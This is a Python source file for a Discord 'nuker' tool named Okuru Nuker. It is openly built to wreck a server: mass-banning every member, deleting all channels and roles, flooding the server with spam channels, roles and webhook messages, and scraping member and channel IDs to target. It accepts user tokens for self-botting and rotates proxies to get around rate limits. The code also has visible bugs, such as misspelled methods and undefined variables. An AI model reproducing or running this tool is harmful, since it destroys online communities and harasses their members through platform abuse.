'''
INFO: Async version may have issues, but it's a good idea to use it anyway for now. If you find a bug, please report it.
INFO: I know soem naming conventions are bad, but I'm not going to change them as they look better for some reason.
'''
import os, sys, threading, time, discord, httpx, colorama, random, json, httpx, asyncio, aiosonic
from discord.ext import commands
from colorama import Fore, init
from itertools import cycle
from utils import *
from tasksio import TaskPool

init()

version = '1.4'
api = 'v9'

util.setTitle('[Okuru Nuker] - Checking Version')
if(not discord.__version__ in ['1.4.0', '1.4.1']):
    util.log('[!]', 'Installing Discord.Py, v1.4.1')
    os.system('pip install discord.py==1.4.1')
    util.cls()
    util.log('[!]', 'Installed Discord.Py v1.4.1.')
    util.log('[!]', 'Restart to see changes.')
    input('{}Press enter to continue...'.format(Fore.LIGHTRED_EX))
    os._exit(0)

util.setTitle('[Okuru Nuker] - Loading Config')
with open('config.json') as f:
    config = json.load(f)
    token = config['General']['Token']
    guild = config['General']['Guild To Nuke']

    ChannelNames = config['Nuke']['Channel Names']
    RoleNames = config['Nuke']['Role Names']

    SpamWebhook = config['Webhook Spam']['Spam']
    WebhookNames = config['Webhook Spam']['Webhook Names']
    WebhookContents = config['Webhook Spam']["Message Contents"]
    WebhookSpamAmount = config['Webhook Spam']['Spam Amount']

util.setTitle('[Okuru Nuker] - Loaded Config')

util.setTitle('[Okuru Nuker] - Loading Scraped')
proxies = util.get_list('proxies.okuru')
members = util.get_list('Scraped/members.okuru')
channels = util.get_list('Scraped/channels.okuru')
roles = util.get_list('Scraped/roles.okuru')
util.setTitle('[Okuru Nuker] - Loaded Scraped')

proxyPool = cycle(proxies)
token_type = util.checkToken(token)

async def get_proxy_dict():
    if(not config['General']['Use Proxies']):
        return({})
    return({'https://': 'http://{}'.format(next(proxyPool))})

if token_type == 'user':
    userBot = True
    headers = {'Authorization': token}
elif token_type == 'bot':
    userBot = False
    headers = {'Authorization': 'Bot {}'.format(token)}

client = commands.Bot(command_prefix=config['General']['Prefix'], case_insensitive=True, self_bot=userBot, help_command=None)

class NukeFunctions:
    async def BanUser(UserID: str) -> bool:
        try:
            r = httpx.put(
                'https://discord.com/api/{}/guilds/{}/bans/{}'.format(api, guild, UserID),
                proxies=await get_proxy_dict()(),
                headers=headers
            )
            if r.status_code in [200, 201, 204]:
                util.log('[!]', 'Banned {}{}'.format(Fore.LIGHTCYAN_EX, UserID))
            elif r.status_code == 429:
                util.log('[!]', 'Ratelimited for {}{}'.format(Fore.LIGHTCYAN_EX, r.json()['retry_after']))
                NukeFunctions.BanUser(UserID)
            return(True)
        except Exception:
            return(await NukeFunctions.BanUser(UserID))
        return(True)
    async def DeleteChannel(ChannelID: str) -> bool:
        try:
            r = httpx.delete(
                'https://discord.com/api/{}/channels/{}'.format(api, ChannelID),
                #proxies=await get_proxy_dict()(),
                headers=headers
            )

            if r.status_code in [200, 201, 204]:
                util.log('[!]', 'Deleted {}{}'.format(Fore.LIGHTCYAN_EX, ChannelID))
            elif r.status_code == 429:
                util.log('[!]', 'Ratelimited for {}{}'.format(Fore.LIGHTCYAN_EX, r.json()['retry_after']))
                NukeFunctions.DeleteChannel(ChannelID)
            return(True)
        except Exception:
            return(await NukeFunctions.DeleteChannel(ChannelID))
        return(True)
    async def DeleteRole(RoleID: str) -> bool:
        r = httpx.delete(
            'https://discord.com/api/{}/guilds/{}/roles/{}'.format(api, guild, RoleID),
            proxies=await get_proxy_dict()(),
            headers=headers
        )
        if r.status_code in [200, 201, 204]:
            util.log('[!]', 'Deleted {}{}'.format(Fore.LIGHTCYAN_EX, RoleID))
        elif r.status_code == 429:
            util.log('[!]', 'Ratelimited for {}{}'.format(Fore.LIGHTCYAN_EX, r.json()['retry_after']))
            return(NukeFunctions.DeleteRole(RoleID))
        return(True)

    async def MakeWebhook(ChannelID: str) -> str:
        try:
            r = httpx.post(
                'https://discord.com/api/{}/channels/{}/webhooks'.format(api, ChannelID),
                headers=headers,
                json={'name': random.choice(WebhookNames)},
                proxies=await get_proxy_dict()()
            ).json()
            return('https://discord.com/api/webhooks/{}/{}'.format(r['id'], r['token']))
        except:
            pass
        return('https://discord.com/')


    async def SendWebhook(WebhookURL: str) -> bool:
        for i in range(WebhookSpamAmount):
            try:
                json={
                    'username': random.choice(WebhookNames),
                    'content': random.choice(WebhookContents)
                }
                httpx.post(WebhookURL, json=json, proxies=await get_proxy_dict()())
                return(True)
            except:
                pass
        return(True)

    async def CreateChannel(ChannelID: str) -> bool:
        r = httpx.post(
            'https://discord.com/api/{}/guilds/{}/channels'.format(api, guild),
            proxies=await get_proxy_dict()(),
            headers=headers,
            json={'name': ChannelID, 'type': 0}
        )
        if r.status_code in [200, 201, 204]:
            util.log('[!]', 'Created {}#{}'.format(Fore.LIGHTCYAN_EX, ChannelID.replace(' ', '-')))
        elif r.status_code == 429:
            util.log('[!]', 'Ratelimited for {}{}'.format(Fore.LIGHTCYAN_EX, r.json()['retry_after']))
            return(await NukeFunctions.CreateChannel(ChannelID))
        return(True)

    async def CreateRole(RoleID: str) -> bool:
        r = httpx.post(
            'https://discord.com/api/{}/guilds/{}/roles'.format(api, guild),
            proxies=await get_proxy_dict()(),
            headers=headers, 
            json={'name': RoleName, 'type': 0}
        )
        if r.status_code in [200, 201, 204]:
            util.log('[!]', 'Created {}{}'.format(Fore.LIGHTCYAN_EX, RoleName))
        elif r.status_code == 429:
            util.log('[!]', 'Ratelimited for {}{}'.format(Fore.LIGHTCYAN_EX, r.json()['retry_after']))
            return(await NukeFunctions.CreateRole(RoleName))
        return(True)


async def nukecmd():
    util.cls()  
    print(f"\u001b[38;5;21m[?]\u001b[38;5;15m Ready To Nuke Server;\n")
    print("\u001b[38;5;21m[?]\u001b[38;5;15m Channel Names Loaded From Config")
    amount = input("\u001b[38;5;21m[?]\u001b[38;5;15m Amount Of Channels: ")
    print()
    print(f"\u001b[38;5;21m[?]\u001b[38;5;15m Role Names Loaded From Config ")  
    amount = input(f"\u001b[38;5;21m[?]\u001b[38;5;15m Amount Of Roles: ")
    util.cls()
    print(f"\u001b[38;5;21m[?]\u001b[38;5;15m Nuking Server...")
    for m in members:
        threading.Thread(target=NukeFunctions.BanUser, args=(m,)).start()

    for c in channels:
        threading.Thread(target=NukeFunctions.DeleteChannel, args=(c,)).start()

    for r in roles:
        threading.Thread(target=NukeFunctions.DeleteRole, args=(r,)).start()

    for i in range(int(amount)):
        threading.Thread(target=NukeFunctions.CreateChannel, args=(random.choice(ChannelNames), )).start()

    for i in range(int(amount)):
        threading.Thread(target=NukeFunctions.CreateRole, args=(random.choice(RoleNames), )).start()

    sys.stdout.write('Finished, Going back in 3 seconds\n')
    time.sleep(3)
    await menu()

util.setTitle('[Okuru Nuker] - Menu')

async def menu():
    util.cls()
    print('''
				\u001b[38;5;111m╔═╗╦╔═╦ ╦╦═╗╦ ╦  ╔╗╔╦ ╦╦╔═╔═╗╦═╗
				\u001b[38;5;159m║ ║╠╩╗║ ║╠╦╝║ ║  ║║║║ ║╠╩╗║╣ ╠╦╝
				\u001b[38;5;195m╚═╝╩ ╩╚═╝╩╚═╚═╝  ╝╚╝╚═╝╩ ╩╚═╝╩╚═\u001b[38;5;26m

			[+]═════════════════════[+]═══════════════════[+]
			 ║ \u001b[38;5;27m[1] - Ban Members     ║ \u001b[38;5;27m[5] - Spam Roles    ║
			 ║ \u001b[38;5;26m[2] - Del Channels    ║ \u001b[38;5;26m[6] - Nuke Server   ║
			 ║ \u001b[38;5;25m[3] - Del Roles       ║ \u001b[38;5;25m[7] - Credits       ║
			 ║ \u001b[38;5;24m[4] - Spam Channels   ║ \u001b[38;5;24m[8] - Scrape        ║
			[+]═════════════════════[+]═══════════════════[+]

			\u001b[38;5;33m'''.center(os.get_terminal_size().columns))
    choice = input('[ > ] ')
    try:
        choice = int(choice)
    except:
        return(await menu())
        
    if choice == 1:
        util.cls(); util.setTitle('[Okuru Nuker] - Member Banning')
        util.log('[!]', 'Starting member ban.')
        with TaskPool(100) as pool:
            for member in members:
                await pool.put(NukeFunctions.BanUser(member))
        util.log('[!!!]', 'Finished, Press Enter to Continue.'); await menu()


    elif choice == 2:
        util.cls(); util.setTitle('[Okuru Nuker] - Channel Deletion')
        util.log('[!]', 'Starting Channel Deletion')
        with TaskPool(100) as pool:
            for channel in channels:
                await pool.put(NukeFunctions.DeleteChannel(channel))
        util.log('[!!!]', 'Finished, Press Enter to Continue.'); input(); await menu()


    elif choice == 3:
        util.cls(); util.setTitle('[Okuru Nuker] - Role Deletion')
        util.log('[!]', 'Starting Role Deletion')
        with TaskPool(100) as pool:
            for role in roles:
                await pool.put(NukeFunctions.DeleteRole(role))
        util.log('[!!!]', 'Finished, Press Enter to Continue.'); input()
        await menu()


    elif choice == 4:
        util.cls(); util.setTitle('[Okuru Nuker] - Create Channels')
        util.log('[?]', 'Channel Amount: ', '')
        amount = input()
        util.log('[!]', 'Starting to Channel Creation')
        with TaskPool(100) as pool:
            for i in range(int(amount)):
                await pool.put(NukeFunctions.CreateChannel, random.choice(ChannelNames))
        util.log('[!!!]', 'Finished, Press Enter to Continue.'); input(); await menu()


    elif choice == 5:
        util.cls()
        util.setTitle('[Okuru Nuker] - Creating Roles')
        
        util.log('[!]', 'Got Names from Config.')
        util.log('[?]', 'Role Amount: ', end='')
        amount = input()
        with TaskPool(100) as pool:
            for i in range(int(amount)):
                await pool.put(NukeFunctions.CreateRole, random.choice(RoleNames))
        util.log('[!!!]', 'Finished, Press Enter to Continue.'); input(); await menu()
        await menu()


    elif choice == 6:
      util.cls()
      util.setTitle('[Okuru Nuker] - Nuke Command')
      await nukecmd()

    elif choice == 7:
        util.cls()
        util.log('[!]', 'Nuker Creators: Gowixx, Aced, and Yum')
        util.log('[!]', 'Press enter to go back.')
        input(); await menu()

    elif choice == 8:
        util.log('[!]', 'Type {}{}scrape {}in any channel of the server.'.format(
            Fore.LIGHTBLUE_EX, client.command_prefix, Fore.RESET
        ))

    else:
        util.log('[!]', '{} is not a valid choice.'.format(choice))
        util.log('[!]', 'Press enter to go back.')
        input();await menu()

@client.command(name='Scrape', description='The Funny.', usage='')
async def scrape(ctx):
    await ctx.message.delete()
    for item in ['members', 'channels', 'roles']:
        try:
            os.remove('Scraped/{}.okuru'.fromat(item))
        except Exception:
            pass
    ctx.guild.members; ctx.guild.channels; ctx.guild.roles

    with open('Scraped/members.okuru', 'w') as f:
        f.write('\n'.join([str(member.id) for member in ctx.guild.members]))
        util.log('[!]', 'Scraped {}{} {}Members.'.format(Fore.LIGHTBLUE_EX, len(ctx.guild.members), Fore.RESET))
    
    with open('Scraped/channels.okuru', 'w') as f:
        f.write('\n'.join([str(channel.id) for channel in ctx.guild.channels]))
        util.log('[!]', 'Scraped {}{} {}Channels.'.format(Fore.LIGHTBLUE_EX, len(ctx.guild.channels), Fore.RESET))

    with open('Scraped/roles.okuru', 'w') as f:
        f.write('\n'.join([str(role.id) for role in ctx.guild.roles]))
        util.log('[!]', 'Scraped {}{} {}Roles.'.format(Fore.LIGHTBLUE_EX, len(ctx.guild.roles), Fore.RESET))
    
    util.log('[!]', 'Restart is required to apply changes.')

    util.log('[!]', 'Press enter to continue.')
    input()
    await menu()


@client.event
async def on_ready():
    if token_type == 'bot':
        await menu()

@client.event
async def on_connect():
    if token_type == 'user':
        await menu()

@client.event
async def on_command_error(ctx, error):
    print(error)
    return


if __name__ == '__main__':
    try:
        util.cls()
        client.run(token, bot=(not userBot))
    except:
        util.log('{}[!]'.format(Fore.RED), 'Invalid Token, Could be Ratelimited.')
